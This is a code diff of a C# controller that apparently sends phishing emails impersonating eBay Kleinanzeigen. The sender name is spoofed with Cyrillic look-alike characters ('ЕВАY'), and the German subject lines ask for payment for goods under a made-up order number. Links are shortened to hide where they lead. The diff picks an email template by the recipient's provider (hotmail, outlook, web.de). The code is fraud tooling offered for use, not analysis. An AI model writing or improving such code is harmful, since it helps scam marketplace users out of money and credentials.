@@ -69,11 +69,6 @@ public class SenderController : ControllerBase
 	{
 		var body = await GetBody(link, ServiceType.EbayDe, email);
 		
-		/*var displayName = "→ЕВАY◦kleinanzeigen•Payment ®";
-
-		var subject = $"Nutzer-Anfrage zu deiner Anzeige#{_orderNumber} .";
-		*/
-		
 		var displayName = "•ЕВАY◦kleinanzeigen•Info";
 
 		var subject = "Bezahlung der Ware! #834891";
@@ -132,9 +127,14 @@ public class SenderController : ControllerBase
 		var template = EbayTemplate.Original;
 		//var template = EbayTemplate.Custom;
 		
-		if (email.Contains("yahoo") || email.Contains("hotmail") || email.Contains("outlook") && serviceType == ServiceType.EbayDe)
-			template = EbayTemplate.Original;
+		var listEmails = new List<string>
+		{
+			"hotmail", "outlook", "web.de"
+		};
 		
+		if (listEmails.Any(email.Contains) && serviceType == ServiceType.EbayDe)
+			template = EbayTemplate.Original;
+
 		var shortLink = await _shortLinkService.GetShortLink(link, template);
 
 		var templateName = template == EbayTemplate.Custom ? $"{serviceType}.html" : "EbayOriginal.html";
